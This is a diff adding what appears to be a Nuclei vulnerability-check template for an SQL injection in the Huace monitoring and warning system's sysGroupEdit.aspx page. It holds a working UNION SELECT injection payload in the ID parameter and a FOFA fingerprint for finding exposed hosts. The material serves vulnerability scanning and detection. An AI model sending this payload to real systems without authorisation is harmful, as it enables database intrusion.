@@ -1,0 +1,34 @@
+id: poc-huace-mews-sysgroupedit-sqli
+
+info:
+  name: 华测监测预警系统 sysGroupEdit.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 华测监测预警系统
+    fofa: icon_hash="-628229493"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /Web/SysManage/sysGroupEdit.aspx?&ID=1%27+UNION+ALL+SELECT+NULL%2CNULL%2Csys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))%2CNULL%2CNULL%2CNULL--+xvRK HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "角色名称"
+          - "name=\"txtgroupname\""
+          - "0x{{t2}}"
+          - "角色描述"
